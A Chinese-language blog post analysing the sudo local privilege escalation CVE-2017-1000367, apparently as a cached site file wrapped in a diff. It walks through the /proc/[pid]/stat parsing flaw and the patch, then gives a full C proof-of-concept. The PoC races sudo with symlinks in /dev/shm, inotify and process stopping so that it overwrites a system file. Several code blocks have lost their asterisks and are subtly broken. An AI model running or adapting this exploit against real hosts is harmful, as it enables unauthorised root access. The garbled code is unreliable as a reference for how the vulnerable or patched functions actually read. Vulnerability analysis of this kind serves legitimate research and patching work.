@@ -1,0 +1,190 @@
+I"�<h1 id="sudo本地提权-cve-2017-1000367-漏洞分析">sudo本地提权 CVE-2017-1000367 漏洞分析</h1>
+<p class="date">12 Jun 2017 - Tr3jer_CongRong</p>
+
+<p>      该漏洞发生在/src/ttyname.c的<code>get_process_ttyname()</code>函数，sudo在获取tty设备号时没有正确解析/proc/[pid]/stat的内容。首先，/proc/[pid]的stat包含了所有的CPU活跃信息，有关触发此漏洞的两个stat参数分别为：</p>
+<pre><code>第2个：comm应用程序或命令的名字
+第7个：tty_nr也就是tty设备号
+</code></pre>
+
+<p>这些参数是使用空格进行分割的，再来看看get_process_ttyname()函数是怎么获取<code>tty_nr</code>的：</p>
+
+<pre><code>len = getline(&amp;line, &amp;linesize, fp);
+fclose(fp);
+if (len != -1) {
+    / Field 7 is the tty dev (0 if no tty) /
+    char cp = line;
+    char ep = line;
+    const char errstr;
+    int field = 0;
+    while (++ep != '\0') {
+        if (ep == ' ') {
+            ep = '\0';
+            if (++field == 7) {
+                dev_t tdev = strtonum(cp, INT_MIN, INT_MAX, &amp;errstr);
+                if (errstr) {
+                    sudo_debug_printf(SUDO_DEBUG_ERROR|SUDO_DEBUG_LINENO,
+                        "%s: tty device %s: %s", path, cp, errstr);
+</code></pre>
+
+<p>      程序在获取tty_nr时也就是根据多少空格个来判断当前是哪个参数，那么上面提到的第2个参数comm，这个参数是以括号独立起来的，并且程序或命令的名字当然允许包含空格。那么就可以通过控制comm参数的空格导致tty_nr的值同样被控制，使得本地攻击者来覆盖文件系统上的任何文件，从而绕过预期权限或获取root shell。</p>
+
+<p>      再来看看补丁，补丁第一处是将get_process_ttyname()函数在获取tty_nr时从’)’后开始获取，这样避免了comm包含空格的特性：</p>
+
+<pre><code>if (nread == 0 &amp;&amp; memchr(buf, '\0', cp - buf) == NULL) {
+    /
+      Field 7 is the tty dev (0 if no tty).
+      Since the process name at field 2 "(comm)" may include
+      whitespace (including newlines), start at the last ')' found.
+     /
+    cp = '\0';
+    cp = strrchr(buf, ')');
+    if (cp != NULL) {
+    char ep = cp;
+    const char errstr;
+    int field = 1;
+
+    while (++ep != '\0') {
+        if (ep == ' ') {
+        ep = '\0';
+        if (++field == 7) {
+            dev_t tdev = strtonum(cp, INT_MIN, INT_MAX, &amp;errstr);
+            if (errstr) {
+            sudo_debug_printf(SUDO_DEBUG_ERROR|SUDO_DEBUG_LINENO,
+                "%s: tty device %s: %s", path, cp, errstr);
+            }
+            if (tdev &gt; 0) {
+            errno = serrno;
+            ret = sudo_ttyname_dev(tdev, name, namelen);
+            goto done;
+            }
+            break;
+        }
+        cp = ep + 1;
+        }
+    }
+    }
+}
+</code></pre>
+
+<p>第二处是添加了搜索设备号对应的设备名的两个地址：</p>
+
+<pre><code> static char ignore_devs[] = {
+     "/dev/fd/",
++    "/dev/mqueue/",
++    "/dev/shm/",
+     "/dev/stdin",
+     "/dev/stdout",
+     "/dev/stderr",
+</code></pre>
+
+<p>POC:</p>
+
+<pre><code>#define _GNU_SOURCE
+#include &lt;errno.h&gt;
+#include &lt;linux/sched.h&gt;
+#include &lt;pty.h&gt;
+#include &lt;sched.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/inotify.h&gt;
+#include &lt;sys/resource.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/wait.h&gt;
+
+#define EVENT_SIZE  ( sizeof (struct inotify_event) )
+#define EVENT_BUF_LEN     ( 1024  ( EVENT_SIZE + 16 ) )
+
+
+int main( )
+{
+
+    int length, i = 0;
+  int fd;
+  int wd;
+  char buffer[EVENT_BUF_LEN];
+
+    int master, slave;
+    char pts_path[256];
+
+    cpu_set_t  mask;
+    struct sched_param params;
+    params.sched_priority = 0;
+    CPU_ZERO(&amp;mask);
+    CPU_SET(0, &amp;mask);
+
+    mkdir("/dev/shm/_tmp", 0755);
+    symlink("/dev/pts/57", "/dev/shm/_tmp/_tty");
+    symlink("/usr/bin/sudo", "/dev/shm/_tmp/     34873 ");
+
+    fd = inotify_init();
+    wd = inotify_add_watch( fd, "/dev/shm/_tmp", IN_OPEN | IN_CLOSE_NOWRITE );
+
+     pid_t pid = fork();
+
+    if(pid == 0) {
+        sched_setaffinity(pid, sizeof(mask), &amp;mask);
+        sched_setscheduler(pid, SCHED_IDLE, &amp;params);
+        setpriority(PRIO_PROCESS, pid, 19);
+
+        sleep(1);
+        execlp("/dev/shm/_tmp/     34873 ", "sudo", "-r", "unconfined_r", "/usr/bin/sum", "—\nHELLO\nWORLD\n", NULL);
+    }else{
+        setpriority(PRIO_PROCESS, 0, -20);
+        int state = 0;
+        while(1) {
+            length = read( fd, buffer, EVENT_BUF_LEN );
+            kill(pid, SIGSTOP);
+
+            i=0;
+            while ( i &lt; length ) {
+                struct inotify_event event = ( struct inotify_event * ) &amp;buffer[ i ];
+
+                if ( event-&gt;mask &amp; IN_OPEN ) {
+                    //kill(pid, SIGSTOP);
+
+                    while(strcmp(pts_path,"/dev/pts/57")){
+                        openpty(&amp;master, &amp;slave, &amp;pts_path[0], NULL, NULL);
+                    };
+                    //kill(pid, SIGCONT);
+                    break;
+
+                }else if ( event-&gt;mask &amp; IN_CLOSE_NOWRITE ) {
+                    //kill(pid, SIGSTOP);
+
+                    unlink("/dev/shm/_tmp/_tty");
+                    symlink("/etc/motd", "/dev/shm/_tmp/_tty");
+                    //kill(pid, SIGCONT);
+
+                    state = 1;
+                    break;
+                }
+
+                i += EVENT_SIZE + event-&gt;len;
+
+            }
+            kill(pid, SIGCONT);
+            if(state == 1) break;
+        }
+
+        waitpid(pid, NULL, 0);
+        inotify_rm_watch( fd, wd );
+        close( fd );
+        close(wd);
+
+        unlink("/dev/shm/_tmp/_tty");
+        unlink("/dev/shm/_tmp/     34873 ");
+        rmdir("/dev/shm/_tmp");
+        close(master);
+        close(slave);
+    }
+
+}
+</code></pre>
+
+<p><img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/4refdergth.png" /></p>
+
+:ET
